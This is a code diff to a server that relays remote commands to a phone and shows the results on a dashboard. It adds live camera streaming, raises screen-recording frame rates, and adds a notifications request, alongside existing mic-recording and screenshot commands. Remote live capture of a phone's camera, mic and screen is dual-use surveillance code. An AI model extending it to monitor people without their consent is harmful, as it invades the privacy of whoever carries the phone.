@@ -120,7 +120,10 @@ const COMMAND_EVENTS = {
   'camera-capture': 'CAMERA_CAPTURE_COMMAND',
   'screenshot': 'SCREENSHOT_COMMAND',
   'screen-record-start': 'SCREEN_RECORD_START',
-  'screen-record-stop': 'SCREEN_RECORD_STOP'
+  'screen-record-stop': 'SCREEN_RECORD_STOP',
+  'camera-stream-start': 'CAMERA_STREAM_START',
+  'camera-stream-stop': 'CAMERA_STREAM_STOP',
+  'request-notifications': 'NOTIFICATIONS_REQUEST'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -141,7 +144,8 @@ function commandPayload(name, body = {}) {
     case 'wallpaper': return { url: body.url || null, color: body.color || null };
     case 'mic-record': return { durationSec: Math.max(5, Math.min(60, Number(body.durationSec) || 15)) };
     case 'camera-capture': return { facing: body.facing === 'front' ? 'front' : 'back' };
-    case 'screen-record-start': return { fps: Math.max(1, Math.min(5, Number(body.fps) || 2)) };
+    case 'camera-stream-start': return { facing: body.facing === 'front' ? 'front' : 'back', quality: body.quality || 'low', fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
+    case 'screen-record-start': return { fps: Math.max(1, Math.min(30, Number(body.fps) || 15)) };
     case 'call-blocklist-sync': return { enabled: !!body.enabled, numbers: Array.isArray(body.numbers) ? body.numbers : [] };
     default: return {};
   }
@@ -490,6 +494,7 @@ function handleMessage(ws, msg) {
     case 'LOCK_RESULT':
     case 'MIC_RECORD_RESULT':
     case 'CAMERA_CAPTURE_RESULT':
+    case 'CAMERA_STREAM_FRAME':
     case 'SCREENSHOT_RESULT':
     case 'SCREEN_RECORD_FRAME':
       broadcastToDashboard(msg.event, payload);
